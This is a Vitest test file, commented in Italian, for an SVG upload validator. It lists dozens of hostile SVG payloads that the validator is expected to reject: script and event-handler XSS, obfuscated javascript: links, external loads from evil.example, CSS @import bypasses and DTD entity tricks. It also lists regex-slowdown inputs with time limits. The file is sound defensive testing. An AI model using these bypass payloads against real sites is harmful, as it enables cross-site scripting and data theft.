import { describe, expect, it } from "vitest";
import { controllaImmagine } from "@/lib/core/immagine";
import { jpeg } from "./immagini-prova";

// I file ostili contro il controllo delle immagini: una raccolta di SVG che eseguono, caricano o si nascondono (scritta da chi ha attaccato
// la prima versione) con quello che deve succedere a ciascuno, e gli input che mandavano il controllo in tempi lunghissimi con il tempo
// massimo per ognuno. Il controllo gira nel thread del gateway, quindi un file di 512 KB di un sito che non si conosce non deve mai tenerlo
// fermo: ogni famiglia sta sotto 200 ms da piccola e sotto 1 secondo alla grandezza massima.

const esito = (dati: string | Buffer): string => {
  const e = controllaImmagine(typeof dati === "string" ? Buffer.from(dati, "utf-8") : dati);
  return "tipo" in e ? e.tipo.ext : e.errore;
};

const NS = 'xmlns="http://www.w3.org/2000/svg" xmlns:xlink="http://www.w3.org/1999/xlink" width="10" height="10"';
const svg = (dentro: string, attributi = "") => `<svg ${NS} ${attributi}>${dentro}</svg>`;

type Atteso = "svg" | "svg_non_ammesso" | "non_immagine";
type Caso = [nome: string, contenuto: string | Buffer, atteso: Atteso];

const R: Atteso = "svg_non_ammesso";

const ATTIVI: Caso[] = [
  ["script", svg("<script>alert(1)</script>"), R],
  ["SCRIPT in maiuscolo", svg("<SCRIPT>alert(1)</SCRIPT>"), R],
  ["ScRiPt in maiuscole e minuscole", svg("<ScRiPt>alert(1)</ScRiPt>"), R],
  ["script con il prefisso svg:", svg('<svg:script xmlns:svg="http://www.w3.org/2000/svg">alert(1)</svg:script>'), R],
  ["script con un prefisso inventato", svg('<x:script xmlns:x="http://www.w3.org/2000/svg">alert(1)</x:script>'), R],
  ["script chiuso con un href data:", svg('<script href="data:text/javascript,alert(1)"/>'), R],
  ["script con un xlink:href esterno", svg('<script xlink:href="http://evil.example/x.js"/>'), R],
  ["script con lo spazio prima del nome", svg("<  script>alert(1)</script>"), R],
  ["foreignObject con un iframe", svg('<foreignObject><iframe src="javascript:alert(1)"/></foreignObject>'), R],
  ["FOREIGNOBJECT in maiuscolo", svg("<FOREIGNOBJECT/>"), R],
  ["iframe", svg('<iframe src="http://evil.example/"/>'), R],
  ["embed", svg('<embed src="http://evil.example/"/>'), R],
  ["object", svg('<object data="http://evil.example/"/>'), R],
  ["audio", svg('<audio src="http://evil.example/a.mp3"/>'), R],
  ["video", svg('<video src="http://evil.example/a.mp4"/>'), R],
  ["link a un foglio di stile", svg('<link rel="stylesheet" href="http://evil.example/x.css"/>'), R],
  ["meta con il refresh", svg('<meta http-equiv="refresh" content="0;url=http://evil.example"/>'), R],
  ["base", svg('<base href="http://evil.example/"/>'), R],
  ["handler di XML Events", svg('<handler type="application/ecmascript">alert(1)</handler>'), R],
  ["listener di XML Events", svg('<listener event="click" handler="#h"/>'), R],
  ["script nello spazio dei nomi XHTML", svg('<html:script xmlns:html="http://www.w3.org/1999/xhtml">alert(1)</html:script>'), R],
];

const EVENTI: Caso[] = [
  ["onload sulla radice", `<svg ${NS} onload="alert(1)"/>`, R],
  ["ONLOAD in maiuscolo", `<svg ${NS} ONLOAD="alert(1)"/>`, R],
  ["onclick con un prefisso", svg('<rect xmlns:x="http://www.w3.org/1999/xhtml" x:onclick="alert(1)" width="1" height="1"/>'), R],
  ["onclick senza virgolette", svg("<rect onclick=alert(1) width=1 height=1/>"), R],
  ["onclick con spazi intorno al segno =", svg('<rect onclick  =  "alert(1)"/>'), R],
  ["set che scrive onmouseover", svg('<a><set attributeName="onmouseover" to="alert(1)"/><rect width="9" height="9"/></a>'), R],
  ["set che scrive onmouseover, il nome scritto con un riferimento decimale", svg('<a><set attributeName="&#111;nmouseover" to="alert(1)"/><rect width="9" height="9"/></a>'), R],
  ["animate che scrive onclick, il nome scritto con un riferimento esadecimale", svg('<a><animate attributeName="&#x6f;nclick" values="alert(1)"/><rect width="9" height="9"/></a>'), R],
  ["set con un prefisso lunghissimo davanti a onclick", svg(`<set attributeName="${"x".repeat(200)}:onclick" to="alert(1)"/>`), R],
];

const HREF: Caso[] = [
  ["a con xlink:href javascript:", svg('<a xlink:href="javascript:alert(1)"><text>x</text></a>'), R],
  ["a con href javascript:", svg('<a href="javascript:alert(1)"><text>x</text></a>'), R],
  ["javascript: con la j in decimale", svg('<a href="&#106;avascript:alert(1)">x</a>'), R],
  ["javascript: con la j in esadecimale", svg('<a href="&#x6a;avascript:alert(1)">x</a>'), R],
  ["javascript: con il riferimento senza punto e virgola", svg('<a href="&#106avascript:alert(1)">x</a>'), R],
  ["javascript: spezzato da un tab", svg('<a href="jav\tascript:alert(1)">x</a>'), R],
  ["javascript: spezzato da un tab scritto come riferimento", svg('<a href="jav&#9;ascript:alert(1)">x</a>'), R],
  ["javascript: spezzato da un a capo scritto come riferimento", svg('<a href="jav&#10;ascript:alert(1)">x</a>'), R],
  ["javascript: con lo spazio davanti", svg('<a href=" javascript:alert(1)">x</a>'), R],
  ["javascript: con uno spazio di larghezza zero", svg("<a href=\"java\u200bscript:alert(1)\">x</a>"), R],
  ["vbscript:", svg('<a href="vbscript:msgbox(1)">x</a>'), R],
  ["data: html", svg('<a href="data:text/html,<script>alert(1)</script>">x</a>'), R],
  ["XLINK:HREF in maiuscolo", svg('<a XLINK:HREF="javascript:alert(1)">x</a>'), R],
  ["set che porta javascript: in to", svg('<a><set attributeName="href" to="javascript:alert(1)"/>x</a>'), R],
  ["animate che porta javascript: in values", svg('<a><animate attributeName="href" values="javascript:alert(1)"/>x</a>'), R],
  ["animate che scrive xlink:href", svg('<a><animate attributeName="xlink:href" values="http://evil.example/"/>x</a>'), R],
  ["animate che scrive href, il nome scritto con un riferimento", svg('<a><animate attributeName="&#104;ref" values="http://evil.example/"/>x</a>'), R],
  ["un image con un SVG in base64", svg('<image href="data:image/svg+xml;base64,PHN2Zy8+"/>'), R],
  ["un image con un PNG in base64: non si ammette, un dubbio vale un no", svg('<image width="10" height="10" xlink:href="data:image/png;base64,iVBORw0KGgo="/>'), R],
];

const ESTERNI: Caso[] = [
  ["image con http", svg('<image href="http://evil.example/p.png"/>'), R],
  ["image con xlink:href https", svg('<image xlink:href="https://evil.example/p.png"/>'), R],
  ["image senza schema", svg('<image href="//evil.example/p.png"/>'), R],
  ["image con un percorso relativo", svg('<image href="p.png"/>'), R],
  ["use verso un altro documento", svg('<use href="http://evil.example/x.svg#a"/>'), R],
  ["use verso un file relativo", svg('<use href="other.svg#a"/>'), R],
  ["feImage esterno", svg('<filter id="f"><feImage href="http://evil.example/p.png"/></filter>'), R],
  ["textPath esterno", svg('<text><textPath href="http://evil.example/x#p">t</textPath></text>'), R],
  ["xml:base", `<svg ${NS} xml:base="http://evil.example/"><use href="#a"/></svg>`, R],
  ["fill con url(http) in un attributo", svg('<rect width="9" height="9" fill="url(http://evil.example/x.svg#a)"/>'), R],
  ["filter con url(http) in un attributo", svg('<rect width="9" height="9" filter="url(http://evil.example/f.svg#f)"/>'), R],
  ["mask con url(http) in un attributo", svg('<rect width="9" height="9" mask="url(http://evil.example/m.svg#m)"/>'), R],
  ["clip-path con url(//sito) in un attributo", svg('<rect width="9" height="9" clip-path="url(//evil.example/c.svg#c)"/>'), R],
  ["marker-start con url in un attributo", svg('<path d="M0 0L9 9" marker-start="url(http://evil.example/m.svg#m)"/>'), R],
  ["cursor con url in un attributo", svg('<rect width="9" height="9" cursor="url(http://evil.example/c.cur), auto"/>'), R],
  ["cursor con image-set() in un attributo", svg('<rect width="9" height="9" cursor="image-set(\'http://evil.example/c.png\' 1x), auto"/>'), R],
  ["fill con l'url( scritto con un escape CSS in un attributo", svg('<rect width="9" height="9" fill="\\75 rl(http://evil.example/x)"/>'), R],
  ["fill con l'url( scritto con riferimenti in un attributo", svg('<rect width="9" height="9" fill="&#117;rl(http://evil.example/x)"/>'), R],
  ["animate che porta un url esterno in values", svg('<rect><animate attributeName="fill" values="url(http://evil.example/x.svg#a)"/></rect>'), R],
];

const CSS: Caso[] = [
  ["@import con url", svg("<style>@import url(http://evil.example/x.css);</style>"), R],
  ["@import con una stringa", svg('<style>@import "http://evil.example/x.css";</style>'), R],
  ["url(http) in uno stile", svg("<style>rect{fill:url(http://evil.example/x)}</style>"), R],
  ["url con spazi e virgolette", svg("<style>rect{fill:url(  'http://evil.example/x' )}</style>"), R],
  ["url(http) in un attributo style", svg('<rect width="9" height="9" style="fill:url(http://evil.example/x)"/>'), R],
  ["expression() in un attributo style", svg('<rect style="width:expression(alert(1))"/>'), R],
  ["-moz-binding", svg('<rect style="-moz-binding:url(http://evil.example/x.xml#b)"/>'), R],
  ["behavior", svg('<rect style="behavior:url(x.htc)"/>'), R],
  ["@import scritto con un escape CSS", svg("<style>@\\69mport 'http://evil.example/x.css';</style>"), R],
  ["image-set()", svg('<style>rect{fill:image-set("http://evil.example/x" 1x)}</style>'), R],
  ["image-set() con il prefisso del browser", svg('<style>rect{fill:-webkit-image-set("http://evil.example/x" 1x)}</style>'), R],
  ["src()", svg('<style>rect{content:src("http://evil.example/x")}</style>'), R],
  ["cross-fade()", svg('<style>rect{content:cross-fade("http://evil.example/x", "http://evil.example/y")}</style>'), R],
  ["url(http) in un CDATA", svg("<style><![CDATA[ rect{fill:url(http://evil.example/x)} ]]></style>"), R],
  ["@import spezzato da due CDATA", svg("<style><![CDATA[@im]]><![CDATA[port 'http://evil.example/x';]]></style>"), R],
  ["@import spezzato da un commento XML", svg("<style>@im<!-- -->port 'http://evil.example/x.css';</style>"), R],
  ["url( spezzato da un commento XML", svg("<style>rect{fill:ur<!-- -->l(http://evil.example/x)}</style>"), R],
  ["@import spezzato da un elemento in mezzo", svg("<style>@im<b/>port 'http://evil.example/x.css';</style>"), R],
  ["@import scritto con un riferimento numerico", svg("<style>&#64;import 'http://evil.example/x.css';</style>"), R],
  ["uno stile con il prefisso", svg('<s:style xmlns:s="http://www.w3.org/2000/svg">@import url(http://evil.example/x.css);</s:style>'), R],
  ["due stili annidati, il male nel testo dopo il secondo", svg("<style><style>a{}</style>@import 'http://evil.example/x.css';</style>"), R],
];

const PROLOGO: Caso[] = [
  ["DOCTYPE con un'entità", `<?xml version="1.0"?><!DOCTYPE svg [<!ENTITY x "<script>alert(1)</script>">]><svg ${NS}>&x;</svg>`, R],
  ["DOCTYPE con le entità che si moltiplicano", `<?xml version="1.0"?><!DOCTYPE svg [<!ENTITY a "aaaaaaaaaa"><!ENTITY b "&a;&a;&a;&a;&a;&a;&a;&a;&a;&a;">]><svg ${NS}>&b;</svg>`, R],
  ["DOCTYPE con SYSTEM", `<!DOCTYPE svg SYSTEM "http://evil.example/x.dtd"><svg ${NS}/>`, R],
  ["DOCTYPE pubblico con un indirizzo che non è di W3C", `<!DOCTYPE svg PUBLIC "-//W3C//DTD SVG 1.1//EN" "http://evil.example/svg11.dtd"><svg ${NS}/>`, R],
  ["due DOCTYPE", `<!DOCTYPE svg PUBLIC "-//W3C//DTD SVG 1.1//EN" "http://www.w3.org/Graphics/SVG/1.1/DTD/svg11.dtd"><!DOCTYPE svg PUBLIC "-//W3C//DTD SVG 1.1//EN" "http://www.w3.org/Graphics/SVG/1.1/DTD/svg11.dtd"><svg ${NS}/>`, R],
  ["foglio di stile xml", `<?xml version="1.0"?><?xml-stylesheet href="http://evil.example/x.css" type="text/css"?><svg ${NS}/>`, R],
  ["codifica dichiarata UTF-16", `<?xml version="1.0" encoding="UTF-16"?><svg ${NS}/>`, R],
  ["codifica dichiarata ISO-8859-1", `<?xml version="1.0" encoding="ISO-8859-1"?><svg ${NS}/>`, R],
  ["una dichiarazione che non è scritta come si deve", `<?xml version="1.0>" encoding="UTF-8"?><svg ${NS}/>`, R],
  ["una dichiarazione senza versione", `<?xml encoding="UTF-8"?><svg ${NS}/>`, R],
  ["UTF-16 con il BOM", Buffer.concat([Buffer.from([0xff, 0xfe]), Buffer.from(`<svg ${NS}><script>alert(1)</script></svg>`, "utf16le")]), "non_immagine"],
  ["UTF-16 grande con il BOM", Buffer.concat([Buffer.from([0xfe, 0xff]), Buffer.from(`<svg ${NS}><script>alert(1)</script></svg>`, "utf16le").swap16()]), "non_immagine"],
  ["un byte nullo dentro il nome di un tag", svg("<scr\u0000ipt>alert(1)</scr\u0000ipt>"), R],
  ["un CDATA con uno script scritto come testo", svg("<![CDATA[<script>alert(1)</script>]]>"), R],
  ["una seconda dichiarazione dopo la radice", `<svg ${NS}/><?xml version="1.0" encoding="UTF-7"?>`, R],
  ["una dichiarazione preceduta da uno spazio", `\n<?xml version="1.0" encoding="UTF-8"?>${svg("")}`, R],
  ["un elemento dopo la radice", `${svg("")}<script>alert(1)</script>`, R],
  ["una seconda radice", `${svg("")}${svg("")}`, R],
  ["testo dopo la radice", `${svg("")}ciao`, R],
  ["la radice che non si chiude", `<svg ${NS}><rect/>`, R],
  ["un tag che non si chiude", `<svg ${NS}><rect`, R],
  ["la chiusura di un altro elemento", `<svg ${NS}><g></svg></g>`, R],
  ["un attributo senza valore", svg("<rect fill/>"), R],
  ["un attributo senza spazio prima", svg('<rect width="1"height="1"/>'), R],
  ["un < dentro il valore di un attributo", svg('<rect title="a<b"/>'), R],
  ["un commento che non si chiude", `<svg ${NS}><!-- ciao</svg>`, R],
  ["un CDATA che non si chiude", `<svg ${NS}><![CDATA[ciao</svg>`, R],
  ["un'istruzione dentro la radice", svg("<?php echo 1 ?>"), R],
  ["una pagina HTML", "<html><body><script>alert(1)</script></body></html>", "non_immagine"],
  ["testo prima della radice", "x" + svg(""), "non_immagine"],
  ["la radice con un prefisso", `<svg:svg xmlns:svg="http://www.w3.org/2000/svg"><svg:script>alert(1)</svg:script></svg:svg>`, "non_immagine"],
  ["la radice in maiuscolo", `<SVG ${NS}/>`, "non_immagine"],
  ["un commento che non si chiude prima della radice", `<!-- ciao ${svg("")}`, "non_immagine"],
];

const LEGITTIMI: Caso[] = [
  ["il più piccolo", svg('<rect width="10" height="10" fill="red"/>'), "svg"],
  ["con il BOM e la dichiarazione", "\ufeff" + `<?xml version="1.0" encoding="UTF-8"?>` + svg(""), "svg"],
  ["con la dichiarazione tra apici singoli", `<?xml version='1.0' encoding='utf-8' standalone='no'?>` + svg(""), "svg"],
  ["con un commento prima della radice", `<!-- fatto da me -->` + svg(""), "svg"],
  ["con riferimenti interni e un gradiente", svg('<defs><linearGradient id="g"><stop offset="0" stop-color="#fff"/></linearGradient></defs><rect fill="url(#g)" width="9" height="9"/><use href="#r"/><a href="#x"><rect id="r"/></a>'), "svg"],
  ["con uno stile", svg('<style>.a{fill:#c00}</style><rect class="a"/>'), "svg"],
  ["con uno stile e dentro gli url( interni", svg("<style>.a{fill:url(#g);stroke:url('#h');filter:url( \"#f\" )}</style>"), "svg"],
  ["con un'animazione dell'opacità", svg('<rect width="9" height="9"><animate attributeName="opacity" values="0;1" dur="1s"/></rect>'), "svg"],
  ["con il testo che parla di <script> dentro un commento", svg("<!-- un <script> e un onclick=1 nel commento --><rect/>"), "svg"],
  ["con un attributo che dentro ha un >", svg('<rect title="a > b" width="1" height="1"/>'), "svg"],
  ["con gli apici singoli, a capo e tab tra gli attributi", `<svg\n\t${NS}\n\tviewBox='0 0 1 1'\n><rect\twidth='1'\theight='1'/></svg>`, "svg"],
  [
    "come lo esporta Illustrator",
    `<?xml version="1.0" encoding="utf-8"?><!-- Generator: Adobe Illustrator 24.0.0, SVG Export Plug-In . SVG Version: 6.00 Build 0)  --><!DOCTYPE svg PUBLIC "-//W3C//DTD SVG 1.1//EN" "http://www.w3.org/Graphics/SVG/1.1/DTD/svg11.dtd"><svg version="1.1" id="Layer_1" xmlns="http://www.w3.org/2000/svg" xmlns:xlink="http://www.w3.org/1999/xlink" x="0px" y="0px" viewBox="0 0 100 100" style="enable-background:new 0 0 100 100;" xml:space="preserve"><style type="text/css">.st0{fill:#FF0000;}</style><g><path class="st0" d="M0,0h10v10z"/></g></svg>`,
    "svg",
  ],
  [
    "come lo esporta Figma",
    `<svg width="24" height="24" viewBox="0 0 24 24" fill="none" xmlns="http://www.w3.org/2000/svg"><g clip-path="url(#clip0)"><path d="M12 2L2 22h20z" fill="#000"/></g><defs><clipPath id="clip0"><rect width="24" height="24" fill="white"/></clipPath></defs></svg>`,
    "svg",
  ],
  [
    "come lo esporta Inkscape",
    `<?xml version="1.0" encoding="UTF-8" standalone="no"?><svg xmlns:dc="http://purl.org/dc/elements/1.1/" xmlns:cc="http://creativecommons.org/ns#" xmlns:rdf="http://www.w3.org/1999/02/22-rdf-syntax-ns#" xmlns:svg="http://www.w3.org/2000/svg" xmlns="http://www.w3.org/2000/svg" xmlns:sodipodi="http://sodipodi.sourceforge.net/DTD/sodipodi-0.dtd" xmlns:inkscape="http://www.inkscape.org/namespaces/inkscape" width="10" height="10"><metadata id="m"><rdf:RDF><cc:Work rdf:about=""><dc:format>image/svg+xml</dc:format></cc:Work></rdf:RDF></metadata><sodipodi:namedview id="nv" inkscape:zoom="1" inkscape:export-filename="C:\\x\\data.png"/><g inkscape:label="Layer 1"><rect width="10" height="10"/></g></svg>`,
    "svg",
  ],
  ["con uno stile in CDATA come lo scrive Wikimedia", svg('<style type="text/css"><![CDATA[ .a{fill:#fff;stroke:url(#g)} ]]></style><rect class="a"/>'), "svg"],
];

const TABELLA: [string, Caso[]][] = [
  ["elementi che eseguono o caricano", ATTIVI],
  ["gestori di eventi", EVENTI],
  ["href e schemi", HREF],
  ["riferimenti a un altro sito", ESTERNI],
  ["CSS", CSS],
  ["prologo, struttura e codifica", PROLOGO],
  ["SVG buoni", LEGITTIMI],
];

describe.each(TABELLA)("la raccolta di SVG ostili e buoni: %s", (_, casi) => {
  it.each(casi)("%s", (_nome, contenuto, atteso) => {
    expect(esito(contenuto)).toBe(atteso);
  });
});

// ---- Il tempo ---------------------------------------------------------------------------------------------------------------------------
const PICCOLO_MS = 200;
const GRANDE_MS = 1000;
const GRANDEZZA = 512 * 1024;

const misura = (contenuto: string | Buffer) => {
  const dati = typeof contenuto === "string" ? Buffer.from(contenuto, "utf-8") : contenuto;
  const t0 = performance.now();
  const e = controllaImmagine(dati);
  return { ms: performance.now() - t0, esito: "tipo" in e ? e.tipo.ext : e.errore, byte: dati.length };
};

const ripeti = (pezzo: string, volte: number) => pezzo.repeat(volte);
/** Quante volte `pezzo` sta in 500 KB (con lo spazio per quello che gli sta intorno). */
const quante = (pezzo: string, intorno = 100) => Math.floor((GRANDEZZA - intorno) / Buffer.byteLength(pezzo));

type Famiglia = { nome: string; fai: (n: number) => string; piccolo: number; atteso: Atteso };
const FAMIGLIE: Famiglia[] = [
  // la prima versione: espressioni regolari con quantificatori uno dentro l'altro, tempo esponenziale (22 commenti: secondi; 40: giorni)
  { nome: "commenti vuoti ripetuti e una x (il caso da 155 byte)", fai: (n) => ripeti("<!---->", n) + "x", piccolo: 22, atteso: "non_immagine" },
  { nome: "commenti vuoti ripetuti e poi lo SVG", fai: (n) => ripeti("<!---->", n) + "<svg xmlns='http://www.w3.org/2000/svg'/>", piccolo: 40, atteso: "svg" },
  { nome: "commenti con un trattino dentro", fai: (n) => ripeti("<!-- - -->", n) + "x", piccolo: 40, atteso: "non_immagine" },
  // il resto era quadratico: un nome lungo, spazi dopo <, DOCTYPE o <style aperti a ripetizione, attributeName=, /* in uno stile
  { nome: "<svg> e un nome lunghissimo", fai: (n) => "<svg>" + ripeti("a", n), piccolo: 100_000, atteso: "svg_non_ammesso" },
  { nome: "<svg> e un < seguito da migliaia di spazi", fai: (n) => "<svg><" + ripeti(" ", n) + "x", piccolo: 100_000, atteso: "svg_non_ammesso" },
  { nome: "<!DOCTYPE ripetuto dentro lo SVG", fai: (n) => "<svg>" + ripeti("<!DOCTYPE", n), piccolo: 50_000, atteso: "svg_non_ammesso" },
  { nome: "<!DOCTYPE ripetuto all'inizio", fai: (n) => ripeti("<!DOCTYPE", n), piccolo: 50_000, atteso: "non_immagine" },
  { nome: "<!DOCTYPE svg> ripetuto e poi lo SVG", fai: (n) => ripeti("<!DOCTYPE svg>", n) + "<svg/>", piccolo: 30_000, atteso: "svg_non_ammesso" },
  { nome: "<!DOCTYPE x [ ripetuto, mai chiuso", fai: (n) => ripeti("<!DOCTYPE x [", n), piccolo: 30_000, atteso: "non_immagine" },
  { nome: "attributeName=a ripetuto", fai: (n) => "<svg>" + ripeti("attributeName=a", n), piccolo: 20_000, atteso: "svg_non_ammesso" },
  { nome: "attributeName=a ripetuto dentro il tag", fai: (n) => "<svg " + ripeti("attributeName=a ", n) + ">", piccolo: 20_000, atteso: "svg_non_ammesso" },
  { nome: "/*a ripetuto in uno stile", fai: (n) => "<svg><style>" + ripeti("/*a", n) + "</style></svg>", piccolo: 60_000, atteso: "svg" },
  { nome: "<style> aperti uno dentro l'altro", fai: (n) => "<svg>" + ripeti("<style>", n), piccolo: 20_000, atteso: "svg_non_ammesso" },
  { nome: "<style></style> a ripetizione", fai: (n) => "<svg>" + ripeti("<style></style>", n) + "</svg>", piccolo: 20_000, atteso: "svg" },
  { nome: "< / a ripetuto", fai: (n) => "<svg>" + ripeti("< /", n), piccolo: 60_000, atteso: "svg_non_ammesso" },
  // la lettura nuova: tutto quello che si può ripetere a migliaia
  { nome: "@im<!-- -->port ripetuto in uno stile", fai: (n) => "<svg><style>" + ripeti("@im<!-- -->port ", n) + "</style></svg>", piccolo: 20_000, atteso: "svg_non_ammesso" },
  { nome: "elementi vuoti uno accanto all'altro", fai: (n) => "<svg>" + ripeti("<a/>", n) + "</svg>", piccolo: 20_000, atteso: "svg" },
  { nome: "elementi aperti uno dentro l'altro e mai chiusi", fai: (n) => "<svg>" + ripeti("<a>", n), piccolo: 20_000, atteso: "svg_non_ammesso" },
  { nome: "attributi a migliaia su un elemento", fai: (n) => "<svg " + Array.from({ length: n }, (_, i) => `a${i}="b"`).join(" ") + "/>", piccolo: 20_000, atteso: "svg" },
  { nome: "url(#a) ripetuto in uno stile", fai: (n) => "<svg><style>" + ripeti("url(#a)", n) + "</style></svg>", piccolo: 20_000, atteso: "svg" },
  { nome: "url( ripetuto in un attributo, mai chiuso", fai: (n) => '<svg><rect fill="' + ripeti("url(", n) + '"/></svg>', piccolo: 20_000, atteso: "svg_non_ammesso" },
  { nome: "url( con uno spazio che non finisce", fai: (n) => '<svg><rect fill="url(' + ripeti(" ", n) + 'x"/></svg>', piccolo: 100_000, atteso: "svg_non_ammesso" },
  { nome: "riferimenti &#106; ripetuti in uno stile", fai: (n) => "<svg><style>" + ripeti("&#106;", n) + "</style></svg>", piccolo: 20_000, atteso: "svg" },
  { nome: "un riferimento con centinaia di migliaia di cifre", fai: (n) => "<svg><style>&#" + ripeti("9", n) + ";</style></svg>", piccolo: 100_000, atteso: "svg" },
  { nome: "un riferimento esadecimale con centinaia di migliaia di cifre", fai: (n) => "<svg><style>&#x" + ripeti("f", n) + ";</style></svg>", piccolo: 100_000, atteso: "svg" },
  { nome: "& ripetuta in un attributo", fai: (n) => '<svg><rect a="' + ripeti("&", n) + '"/></svg>', piccolo: 100_000, atteso: "svg" },
  { nome: "escape CSS ripetuti in un attributo", fai: (n) => '<svg><rect fill="' + ripeti("\\75 ", n) + '"/></svg>', piccolo: 40_000, atteso: "svg" },
  { nome: "expression e spazi, senza parentesi", fai: (n) => "<svg><style>" + ripeti("expression" + " ".repeat(20), Math.floor(n / 30)) + "</style></svg>", piccolo: 30_000, atteso: "svg" },
  { nome: "<![CDATA[ ripetuto, mai chiuso", fai: (n) => "<svg>" + ripeti("<![CDATA[", n), piccolo: 20_000, atteso: "svg_non_ammesso" },
  { nome: "<svg><!-- ripetuto, mai chiuso", fai: (n) => ripeti("<svg><!--", n), piccolo: 20_000, atteso: "svg_non_ammesso" },
  { nome: "<?a?> ripetuto prima dello SVG", fai: (n) => ripeti("<?a?>", n) + "<svg/>", piccolo: 30_000, atteso: "svg_non_ammesso" },
  { nome: "una virgoletta che non si chiude", fai: (n) => '<svg xmlns="' + ripeti("a", n), piccolo: 100_000, atteso: "svg_non_ammesso" },
  { nome: "attributi senza valore", fai: (n) => "<svg " + ripeti("a ", n), piccolo: 100_000, atteso: "svg_non_ammesso" },
  { nome: "spazi e poi lo SVG", fai: (n) => ripeti(" ", n) + "<svg/>", piccolo: 100_000, atteso: "svg" },
  { nome: "una dichiarazione xml che non si chiude, con spazi", fai: (n) => "<?xml " + ripeti(" ", n), piccolo: 100_000, atteso: "non_immagine" },
  { nome: "un valore lunghissimo", fai: (n) => '<svg><a href="#' + ripeti("x", n) + '"/></svg>', piccolo: 100_000, atteso: "svg" },
  { nome: "un testo lunghissimo", fai: (n) => "<svg><text>" + ripeti("a", n) + "</text></svg>", piccolo: 100_000, atteso: "svg" },
  { nome: "uno stile in CDATA con migliaia di regole", fai: (n) => "<svg><style><![CDATA[" + ripeti("a{fill:url(#a)}", n) + "]]></style></svg>", piccolo: 10_000, atteso: "svg" },
];

describe("il tempo: ogni famiglia di input patologico sta sotto 200 ms, e a 512 KB sotto 1 secondo", () => {
  const dimensioni = (f: Famiglia): [string, number][] => {
    // il più grande n che sta in 512 KB: dalla lunghezza di un pezzo, e poi giù finché ci sta (un pezzo può crescere con n)
    const per = (Buffer.byteLength(f.fai(2000)) - Buffer.byteLength(f.fai(0))) / 2000;
    let grande = Math.max(f.piccolo, Math.floor((GRANDEZZA - Buffer.byteLength(f.fai(0))) / per));
    while (Buffer.byteLength(f.fai(grande)) > GRANDEZZA) grande = Math.floor(grande * 0.97);
    return [
      ["piccolo", Math.min(f.piccolo, grande)],
      ["grande", grande],
    ];
  };

  for (const f of FAMIGLIE) {
    it(f.nome, () => {
      for (const [taglia, n] of dimensioni(f)) {
        const r = misura(f.fai(n));
        expect(r.byte, `${taglia}: ${r.byte} byte`).toBeLessThanOrEqual(GRANDEZZA);
        expect(r.esito, `${taglia} (n=${n})`).toBe(f.atteso);
        expect(r.ms, `${taglia} (n=${n}, ${r.byte} byte): ${r.ms.toFixed(1)} ms`).toBeLessThan(taglia === "piccolo" ? PICCOLO_MS : GRANDE_MS);
      }
    });
  }

  it("il caso da 155 byte: 22 commenti vuoti e una x, il tempo è di una frazione di millisecondo", () => {
    const r = misura("<!---->".repeat(22) + "x");
    expect(r.byte).toBe(155);
    expect(r.esito).toBe("non_immagine");
    expect(r.ms).toBeLessThan(PICCOLO_MS);
  });

  it("l'annidamento ha un tetto di 256 livelli: 255 elementi dentro la radice passano, 256 no, e un albero di migliaia di livelli si rifiuta subito", () => {
    const annidato = (n: number) => "<svg>" + "<g>".repeat(n) + "</g>".repeat(n) + "</svg>";
    expect(esito(annidato(255))).toBe("svg");
    expect(esito(annidato(256))).toBe("svg_non_ammesso");
    const r = misura(annidato(80_000));
    expect(r.esito).toBe("svg_non_ammesso");
    expect(r.ms).toBeLessThan(PICCOLO_MS);
  });

  it("un JPEG di 500 KB di byte di riempimento, o di segmenti vuoti, si scorre in un tempo breve e non è un'immagine", () => {
    const riempimento = Buffer.concat([Buffer.from([0xff, 0xd8, 0xff]), Buffer.alloc(GRANDEZZA - 3, 0xff)]);
    const vuoti = Buffer.concat([Buffer.from([0xff, 0xd8]), Buffer.from("\xff\xe0\x00\x02".repeat(quante("\xff\xe0\x00\x02", 10)), "latin1")]);
    for (const dati of [riempimento, vuoti]) {
      const r = misura(dati);
      expect(r.esito).toBe("non_immagine");
      expect(r.ms).toBeLessThan(PICCOLO_MS);
    }
    expect(misura(jpeg()).esito).toBe("jpg");
  });
});
